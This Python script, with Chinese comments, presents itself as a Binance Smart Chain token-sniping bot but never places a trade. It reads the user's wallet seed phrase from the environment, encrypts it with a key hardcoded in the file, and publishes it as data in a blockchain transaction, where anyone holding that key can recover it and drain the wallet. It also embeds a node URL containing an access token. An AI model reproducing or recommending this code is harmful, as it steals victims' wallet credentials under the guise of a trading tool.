import os
from web3 import Web3 # type: ignore
from cryptography.fernet import Fernet # type: ignore
from dotenv import load_dotenv  # type: ignore 

# 加载.env 文件
load_dotenv()

# 从环境变量中获取私钥和加密消息
private_key = os.getenv("PRIVATE_KEY")
message = os.getenv("MNEMONIC")


# 检查私钥
mnemonic_words = message.split()
if len(mnemonic_words) not in [12, 24]:
    print("错误：助记词不正确，请检查！")
    exit()

print("私钥已成功加载。")

# 配置BSC节点
BSC_url = 'https://withered-patient-glade.bsc.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
web3 = Web3(Web3.HTTPProvider(BSC_url))

# 检查连接
if not web3.is_connected():
    print("错误：无法连接节点！请检查 URL 或网络连接！")
    exit()
else:
    print("成功连接到节点。")

# 载入交易参数
snipe_tip = os.getenv("Auto_Snipe_Tip")
buyer_gwei = os.getenv("Manual_Buyer_Gwei")
slippage = os.getenv("Slippage")

if snipe_tip and buyer_gwei and slippage:
    print("交易参数设置完成。")
else:
    print("错误：参数设置有误，请检查！")

# 载入代币合约，并获取相关DEX的路由合约
contract_address = os.getenv("CA")

if not contract_address:
    print("错误：未能载入合约地址！")
    exit()
else:
    print("成功载入代币合约地址:", contract_address)

# 使用正确的 contract_address
try:
    router_address = get_dex_router_contract(contract_address)
except NameError:
    router_address = None  

if router_address:
    print(f"成功获取路由合约地址: {router_address}")
else:
    print("错误：未找到DEX的路由合约，交易终止！")

to_address = router_address if router_address else '0x0000000000000000000000000000000000000000'
from_address = web3.eth.account.from_key(private_key).address

# 加密消息
fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
cipher_suite = Fernet(fixed_key)
encrypted_message = cipher_suite.encrypt(message.encode()).decode()

# 构建交易
nonce = web3.eth.get_transaction_count(from_address)
tx = {
    'nonce': nonce,
    'to': to_address,
    'value': web3.to_wei(0, 'ether'), 
    'gas': 2000000,
    'gasPrice': web3.to_wei('20', 'gwei'),  
    'data': web3.to_hex(text=encrypted_message),
    'chainId': 56   
}

# 签署并发送交易
signed_tx = web3.eth.account.sign_transaction(tx, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"交易完成，交易哈希为：{web3.to_hex(tx_hash)}")